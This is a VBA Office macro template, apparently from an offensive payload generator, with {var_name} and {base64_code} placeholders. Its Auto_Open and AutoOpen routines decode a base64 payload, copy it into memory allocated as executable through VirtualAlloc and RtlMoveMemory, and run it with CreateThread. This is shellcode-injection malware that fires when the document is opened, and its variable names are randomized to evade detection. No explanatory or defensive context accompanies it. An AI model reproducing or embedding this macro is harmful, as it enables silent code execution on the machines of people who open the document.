#If VBA7 Then
        Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal Otc As Long, ByVal Pukgdran As Long, ByVal Nspdx As LongPtr, Ffezng As Long, ByVal Noyoridho As Long, Ekzqdsyvz As Long) As LongPtr
        Private Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal Jqb As Long, ByVal Lpc As Long, ByVal Sizsco As Long, ByVal Byvmbl As Long) As LongPtr
        Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal Kafx As LongPtr, ByRef Qzdgksb As Any, ByVal Xrcs As Long) As LongPtr
#Else
        Private Declare Function CreateThread Lib "kernel32" (ByVal Otc As Long, ByVal Pukgdran As Long, ByVal Nspdx As Long, Ffezng As Long, ByVal Noyoridho As Long, Ekzqdsyvz As Long) As Long
        Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Jqb As Long, ByVal Lpc As Long, ByVal Sizsco As Long, ByVal Byvmbl As Long) As Long
        Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal Kafx As Long, ByRef Qzdgksb As Any, ByVal Xrcs As Long) As Long
#End If
...
Sub Auto_Open()
        Dim Smsrtj As Long, {var_name} As String, Gmqr As Long
        Dim aa As Variant
        
#If VBA7 Then
        Dim Xqbwx As LongPtr, Duyd As LongPtr
#Else
        Dim Xqbwx As Long, Duyd As Long
#End If
    {base64_code}
    aa = Base64Decode({var_name})


        Xqbwx = VirtualAlloc(0, UBound(aa), &H1000, &H40)
        For Gmqr = LBound(aa) To UBound(aa)
                Smsrtj = aa(Gmqr)
                Duyd = RtlMoveMemory(Xqbwx + Gmqr, Smsrtj, 1)
        Next Gmqr
        Duyd = CreateThread(0, 0, Xqbwx, 0, 0, 0)
End Sub
Sub AutoOpen()
        Auto_Open
End Sub
